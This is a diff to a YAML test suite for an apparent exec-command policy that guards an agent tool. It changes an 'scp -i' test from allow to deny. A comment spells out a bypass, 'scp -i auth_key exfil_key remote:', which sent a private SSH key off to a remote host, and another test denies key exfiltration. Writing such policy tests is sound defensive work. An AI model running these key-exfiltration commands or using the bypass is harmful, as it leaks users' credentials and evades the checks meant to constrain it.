@@ -178,10 +178,13 @@ tests:
 
   # ── SSH key transfer (scp/rsync edge cases) ─────────────────────────────────
 
-  - name: "allow: scp -i auth key (legitimate)"
+  # Note: scp -i is now blocked as a security tradeoff. The -i exclusion was
+  # removed because it enabled a bypass: scp -i auth_key exfil_key remote:
+  # Users needing -i auth can use ssh-agent or add a local policy override.
+  - name: "deny: scp -i auth key (tradeoff for dual-key bypass fix)"
     tool: exec
     params: {command: "scp -i ~/.ssh/id_rsa user@host:file.txt ."}
-    expect: allow
+    expect: deny
 
   - name: "deny: scp exfil private key"
     tool: exec
